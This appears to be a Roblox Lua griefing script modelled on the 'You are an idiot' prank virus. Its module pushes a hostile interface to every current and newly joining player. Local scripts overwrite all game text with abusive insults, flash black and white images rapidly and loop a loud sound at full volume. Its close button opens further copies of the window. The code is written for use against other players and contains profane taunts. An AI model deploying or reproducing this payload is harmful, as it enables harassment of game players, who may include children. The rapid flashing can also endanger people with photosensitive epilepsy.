-- Module Scripts:

local fake_module_scripts = {}

do -- nil.MainModule
	local script = Instance.new('ModuleScript', nil)
	script.Name = "MainModule"
	local function module_script()
		local UAREAIDIOT = {}
		
		function INSERT(PLAYER)
			local VIRUS=script["YOU ARE AN IDIOT"]:clone()
			VIRUS.Parent=PLAYER.PlayerGui
			warn("YOU ARE AN IDIOT "..PLAYER.Name)
		end 
		
		function UAREAIDIOT:INFECT()
			for i,v in pairs(game:GetService("Players"):children())do
				INSERT(v)
			end
			game:GetService("Players").PlayerAdded:connect(function(p)
				INSERT(p)
			end)
			warn("GET FUCKING TROLLED BITCH!")
		end
		return UAREAIDIOT
		
	end
	fake_module_scripts[script] = module_script
end


-- Scripts:

local function OTFHPR_fake_script() -- YOUAREANIDIOT.LocalScript 
	local script = Instance.new('LocalScript', YOUAREANIDIOT)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	wait(1)
	local i=0
	script.Parent.ADD_TAB.Event:Connect(function()
		local TAB=script.Parent.XP.TAB:Clone()
		TAB.Parent=script.Parent.XP
		TAB.Position=UDim2.new(UDim.new((i),0),UDim.new((i),0))
		i=i+.02		
	end)
	
	local fonts={"Cartoon","Code","SourceSans","Gotham","SciFi","GothamBlack","Fantasy","Garamond","Highway","Legacy","SourceSansBold","SourceSansLight","Arcade","Arial","ArialBold"}
	local plr=game:service"Players".LocalPlayer
	while true do
		game:GetService("RunService").RenderStepped:wait()
		--local val=#script.Parent.XP:children()
		--workspace.CurrentCamera.FieldOfView=70-math.random(1,val)
		local p=plr.PlayerGui 
		for i,v in pairs(p:GetDescendants())do
			if v:isA"TextLabel"or v:isA"TextBox" or v:isA"TextButton"then
				local font=fonts[math.random(1,#fonts)]
				v.Font=font
				v.Text="YOU ARE AN IDIOT NOONE LIKES YOU YOUR PARENTS DONT CARE ABOUT YOU HAHAHAHAHAH!"
			end
		end
		local w=workspace
		for i,v in pairs(w:GetDescendants())do
			if v:isA"TextLabel"or v:isA"TextBox"or v:isA"Message"or v:isA"Hint"then
				local font=fonts[math.random(1,#fonts)]
				v.Font=font
	                        v.Text="YOU ARE AN IDIOT DUM ASS!"
			end
		end	
	end
end
coroutine.wrap(OTFHPR_fake_script)()
local function NRNF_fake_script() -- FLASH.LocalScript 
	local script = Instance.new('LocalScript', FLASH)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local tim=.5
	local black="http://www.roblox.com/asset/?id=35237735"
	local white="http://www.roblox.com/asset/?id=35237757"
	
	function set(id)
		script.Parent.Image=id
	end
	while wait()do
		wait(tim)
		set(black)
		wait(tim)
		set(white)
		wait(tim)
		set(black)
		wait(tim)
		set(white)
	end
end
coroutine.wrap(NRNF_fake_script)()
local function YTWAQV_fake_script() -- CLOSE.LocalScript 
	local script = Instance.new('LocalScript', CLOSE)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent.Parent.ADD_TAB:Fire()
	end)
end
coroutine.wrap(YTWAQV_fake_script)()
local function VOEB_fake_script() -- TAB.LocalScript 
	local script = Instance.new('LocalScript', TAB)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.Active=true
	script.Parent.Selectable=true
	script.Parent.Draggable=true
	
	local sound=Instance.new("Sound")
	
	sound.Parent=script
	sound.Volume=10
	sound.SoundId="rbxassetid://138168279"
	sound.Name="YOUR AN IDIOT!"
	sound.Looped=true
	sound:Play()
end
coroutine.wrap(VOEB_fake_script)()
